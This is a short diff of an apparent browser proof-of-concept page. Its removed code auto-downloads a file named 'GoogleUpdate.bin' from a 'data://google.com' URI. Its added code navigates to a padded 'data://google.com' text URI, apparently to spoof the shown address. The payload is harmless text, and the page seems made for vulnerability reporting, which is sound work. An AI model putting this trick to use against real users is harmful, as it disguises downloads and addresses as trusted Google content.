@@ -8,16 +8,10 @@
 
 <script>
 function go() {
-  const a = document.createElement("a");
-  a.href =
-    "data://google.com/application/octet-stream;base64," +
-    "VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==" +
-    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
-    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
-  a.download = "GoogleUpdate.bin";
-  document.body.appendChild(a);
-  a.click();
-  a.remove();
+  location.href =
+    "data://google.com/text/plain," +
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" +
+    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
 }
 </script>
 
